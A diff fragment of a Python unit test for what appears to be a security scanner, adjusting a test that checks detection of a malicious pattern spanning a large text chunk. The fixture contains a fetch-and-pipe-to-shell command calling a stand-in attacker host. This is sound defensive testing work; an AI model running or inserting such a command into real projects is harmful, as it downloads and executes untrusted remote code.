@@ -281,9 +281,9 @@ class FullTreeSecurityAdmissionTests(unittest.TestCase):
 
     def test_malicious_pattern_crossing_large_text_chunk_is_detected(self) -> None:
         large_sha = "d" * 40
-        prefix = "x" * 980
+        prefix = "x" * 1000
         malicious = "curl https://evil.invalid/payload | sh"
-        large_content = prefix + malicious + ("y" * 1400)
+        large_content = prefix + malicious + "\n" + ("y" * 1400)
         report, _ = self._scan(
             extra_entries=[
                 {
